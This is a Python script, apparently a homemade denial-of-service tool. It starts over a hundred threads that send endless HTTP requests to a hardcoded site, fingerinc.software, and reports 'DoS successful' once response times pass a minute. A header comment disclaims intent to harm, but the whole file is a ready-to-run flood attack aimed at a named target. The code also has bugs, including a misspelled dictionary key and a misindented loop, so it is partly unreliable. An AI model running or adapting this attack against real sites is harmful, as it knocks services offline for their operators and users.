#Developed by Vignesh SB (Admin404).
#Please read the Readme file for better understanding of the tool.
#This tool is not intended to make any damage to any one.
import requests
import threading
import time
alpha=[]
ralpha=[]
def accurate_time():
    return round(time.time()*1000)
def appox_time():
    return round(time.time())
def no_of_resp_per_sec(time_took):
    t=appox_time()
    alpha.append({
        "time_took":time_took,
        "time_recevived": t,})
    for e in alpha:
        if appox_time()- e["time_received"]>=1:
            alpha.remove(e)
def no_of_req_per_sec():
    t= appox_time()
    ralpha.append({
        "time_received": t,})
     for e in ralpha:
        if appox_time() -e["time_received"] >=1:
            ralpha.remove(e)
message="DoSing..."
def make_request(name):
    while True:
        no_of_req_per_sec()
        try:
            s= accurate_time()
            r=requests.get('http://fingerinc.software')
            t= accurate_time() -s
            #edit required here!
            no_of_resp_per_sec(t)
        except:
            message="DoS successful, The site looks down for now."
threads=128
i=0
while i <= threads:
    x=threading.Thread(target=make_request, args=(i,))
    print("Starting thread #{}...".format(i))
    x.start()
    i+=1
print("Calculating... wait for a while for it to adjust...")
while True:
    time.sleep(0.1)
    response_time=0
    for e in alpha:
        response_time=response_time+e['time_took']
    if(len(alpha))>0:
        response_time=response_time/len(alpha)
    if response_time>60000:
        message="DoS Successful. Site looks down for now."
    else:
        message="Dosing..."
    print("\rAverage responce time: {}ms; Requests/sec: {}; Responses/sec: {};{}".format(round(response_time, 2), len(ralpha),len(alpha),message), end="")
    
